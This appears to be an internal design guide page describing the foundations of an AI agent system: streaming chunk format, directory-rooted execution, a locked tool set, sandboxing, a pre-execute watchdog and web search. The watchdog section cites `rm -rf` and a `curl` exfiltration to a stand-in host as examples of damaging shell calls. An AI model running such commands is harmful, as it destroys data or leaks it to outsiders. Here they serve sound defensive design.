---
title: Foundations
description: The bedrock the rest of the guide rests on. AI SDK v6 as the streaming substrate, directory-rooted execution, the locked fundamental tool set summary, sandbox placement, the watchdog, the case for web search as a special fundamental tool, and the cross-cutting invariants every implementation MUST honor.
keywords:
  [
    agent-system,
    ai-sdk,
    fundamental-tools,
    sandbox,
    watchdog,
    web-search,
    directory-rooted,
    invariants,
  ]
format: md
tags:
  - internal
  - wg
  - agent-system
---

# Foundations

Bedrock — the assumptions the rest of the guide rests on. An
implementor MAY swap any of these, but each swap pulls a
cross-cutting change. Read [`index`](./index.md) first for the
vocabulary.

## Streaming substrate: AI SDK v6

The agent system's wire format is the AI SDK v6 `UIMessageChunk`
stream. Every assistant turn — whichever model, whichever provider,
whichever runtime path — emits the same chunk vocabulary
(`text-{start,delta,end}`, `reasoning-{start,delta,end}`,
`tool-input-{start,delta,available}`,
`tool-output-{available,error}`, `file`, `source-url`,
`source-document`, `data-*`, `finish-step`, `finish`).

**Why this pin.** The AI SDK chunk shape is the only piece of the
system that crosses both the provider boundary and the host
boundary. If the recorder, the resume layer, the renderer, and the
canonical inspection format all agree on the chunk shape, every
other layer moves independently. Pinning is cheaper than
translating.

**What the AI SDK provides this guide for free.**

- Tool input streaming (`tool-input-delta` during a generation).
- Per-step usage capture (the `onStepFinish` callback the recorder
  taps for token rollups).
- An abort-signal model (one `AbortSignal` passed through the call
  chain).
- A reducer (`@ai-sdk/react`'s `useChat`) that enforces well-formed
  chunk order on the consumer.

**Two consequences worth naming up front.**

1. `text-delta` MUST be preceded by `text-start` for the same
   message id. A "join an in-flight stream at chunk N" feature MUST
   replay the chunk log from the start, not from N. See
   [Session lifecycle / streaming](./session.md#streaming-and-layering).
2. Tool I/O on the wire is two events, not one. The model emits
   `tool-input-{start,delta,available}` while it generates the call;
   the runtime emits `tool-output-{available,error}` when the tool
   returns. The session schema collapses both into one row per
   `tool_call_id`; the canonical format keeps them separate.

### Native vs adapter path

A high-traffic implementor MAY skip the AI SDK call layer for cost
and latency (one less round of serialization). The guide allows it
as long as the resulting stream is still AI-SDK-chunk-shaped. Both
paths run the same downstream code.

Implementor notes that live outside AI SDK's own documentation — the
token-usage cache normalization rule, where the SDK's tool-loop
helper fits, what the RFC adds on top of the substrate — are
collected in [`ai-sdk`](./ai-sdk.md).

### Outward wire vs internal stream

The AI SDK chunk shape is the **internal** stream — the language the
core, the recorder, the canonical inspection format, and the resume
layer all speak. When the host delivers the stream to an external
client (an editor, an IDE, another agent host), the **outward** wire
is [ACP](./acp.md). A thin adapter translates AI-SDK-v6 chunks to
ACP `session/update` notifications without introducing buffering or
its own state. See [ACP integration](./acp.md) for the mapping.

## Directory-rooted execution

An agent runs **on top of a directory**. That directory is one of:

- A workspace the user opened on their local machine.
- An ad-hoc file's containing directory (quick-open).
- A cloud sandbox provisioned for the run.
- A git worktree the user is on.

The agent's `fs.*` capability is bounded by that root (and any
additional roots the manifest declares — for example `{user-data}`
for config writes). It is never bounded by the host's whole
filesystem.

This is the smallest assumption the rest of the guide leans on:

- **Skills discovery** walks upward from the root looking for
  `.agents/skills/` and equivalents. See [`skills`](./skills.md).
- **System prompt** includes the root, the platform, and the git
  status as ambient context.
- **Sandbox sub-policies** are expressed relative to the root.
- **Subagent `task` calls** inherit the root unless explicitly
  overridden.

The root is **resolved at session start** and is **immutable** for
the session's lifetime. A "move to a different directory" is a new
session.

## Locked fundamental tools

Every implementation MUST ship the locked tool set. The 13 ids are
`read`, `write`, `edit`, `glob`, `grep`, `bash`, `todo`, `task`,
`question`, `web_search`, `web_fetch`, `skill`, `tool_search`.

The set is **non-opinionated**: each tool is the smallest thing it
can be. Models trained on tool use have learned these names; the
lock guarantees portability. Per-tool shapes, capability
declarations, and the result envelope live in [`tools`](./tools.md).

## Sandbox placement

The sandbox is the **host's responsibility**, not the agent
system's. The runtime publishes a capability surface; the host
enforces it. See [`environments`](./environments.md) for the three
environments (web / cloud sandbox / computer) and their sandbox
primitives.

What the agent system guarantees in return: **no free
`process.spawn`, no free `fetch`, no free `fs.*`.** Every side
effect goes through a declared capability. The host enforces its
policy at one boundary instead of chasing every tool author.

## Watchdog

A pre-execute hook on every tool call. The watchdog inspects the
tool id, the validated arguments, the agent's manifest, and the
session id, and returns:

- `allow` — the call proceeds.
- `deny(reason)` — the call fails with a tool error. The model gets
  the reason on the next turn and can adjust.
- `ask` — only on a host with a human user; the host shows the
  command, the user picks once / always / reject. Headless hosts
  MUST treat `ask` as `deny`.

**Why pre-execute and not post-tool-call.** The damaging act of a
shell call (`rm -rf`, `curl <data> exfil.example.com`) is the call
itself. Post-call rejection is too late.

### Reference policy for `bash`

The watchdog is intentionally generic; the guide does not name a
"dangerous" command. A reasonable reference policy:

- Allow read-only commands by default (`ls`, `cat`, `grep`, `find`,
  `git status`, `git log`, language-version checks).
- Ask on writes outside the workspace root, network downloads, and
  privileged commands.
- Deny commands that touch destructive system paths regardless of
  who asked.

Policies are per-host. A CI host can be stricter (ask for everything
not on an allowlist). A local-dev host can be looser (allow within
the workspace, ask outside).

### Watchdog vs permission rules vs sandbox

Three layers, defense in depth:

1. **Manifest / runtime capability.** Refuses out-of-scope paths
   and hosts at the API boundary. No model output reaches the OS.
2. **Watchdog.** Refuses categories of arguments the manifest
   cannot express ("no commands that look like exfiltration").
3. **Environment sandbox.** Refuses things the runtime
   mis-let-through.

Each layer is sufficient for its kind of failure. Together they
form the budget for the agent to do real work.

## Web search

Web search is a **fundamental tool that is not implementable
in-house**. The host wires it to a real provider; the agent sees one
tool with one input and one output shape across providers.

```ts
web_search({ query: string, max_results?: int })
  → { results: { title, url, snippet }[] }
```

Provider seam: the provider is the host's choice and SHOULD be
**stable per session** (hash the session id to pick) so a flaky
provider fails consistently and inspection shows one row, not a
random walk.

Cost and quota: per-session call cap (default ~25); per-call
timeout (default 15s) that returns a tool error rather than hanging;
deterministic provider pick per session.

Putting web search in the lock forces every host to wire one — the
friction of bringing a key is paid once, not per agent.

## Cross-cutting invariants

The following hold across every implementor:

- **One universal LLM loop.** Whichever agent runs, whichever model
  is picked, the loop is the same code. Agent specialization is
  config, not a fork of the loop.
- **AI SDK v6 chunk shape internally.** Both runtimes (native + AI
  SDK adapter) emit the same envelope. The chunk shape is the lingua
  franca inside the host.
- **ACP is the recommended outward protocol.** When the agent is
  consumed by an external client, the
  [Agent Client Protocol](https://agentclientprotocol.com/) wraps
  the internal stream. See [ACP integration](./acp.md).
- **Three-table session shape.** `chat_sessions` /
  `chat_messages` / `chat_parts`, JSON for part data. Implementors
  that pick a different DB engine port the three tables. See
  [Persistency](./persistency.md).
- **No free side effects.** Every tool's `requires` is declared
  upfront; the runtime refuses out-of-scope calls.
- **Subagents share the loop.** A subagent is a child session
  running the same code, gated by intersected permissions. See
  [Subagents](./subagents.md).
- **Compaction is mandatory above a threshold.** No implementor
  ships "the model just stops working at 100% context." See
  [Compaction](./session.md#compaction).

## See also

- [Session Lifecycle](./session.md) — what runs on top of the
  AI-SDK-v6 + SQLite bedrock.
- [Tools](./tools.md) — per-tool detail of the locked set.
- [Environments](./environments.md) — sandbox primitives by host
  environment.
- [Persistency](./persistency.md) — the three-table schema.
- [ACP integration](./acp.md) — the outward wire.
